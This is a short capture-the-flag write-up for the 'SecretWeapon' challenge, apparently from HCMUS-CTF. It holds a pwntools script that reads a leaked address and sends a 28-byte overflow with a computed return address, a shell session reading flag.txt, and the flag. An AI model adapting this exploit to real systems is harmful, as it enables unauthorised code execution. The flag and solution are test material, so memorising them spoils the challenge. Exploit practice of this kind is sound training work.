## SecretWeapon (100 points)

#### Solved by nhanlun

```
The war is comming!!! Could you have me to get the weapons

nc 61.28.237.24 30201

author: pakkunandy
```

```py
from pwn import *

conn = remote("61.28.237.24", 30201)
conn.recvline()
line = conn.recvline().decode().replace("Your current location is townsquare with the address ", "")

address = int(line, 16)
log.info("Leaked: " + hex(address))

conn.sendline(b'A' * 28 + p32(0x112d6 - 0x112ff + address))
conn.interactive()
```

```
$ ls
bin
dev
flag.txt
lib
lib32
lib64
weapon
$ cat flag.txt
HCMUS-CTF{you_know_how_to_compute_location}
```

**Flag:** `HCMUS-CTF{you_know_how_to_compute_location}`
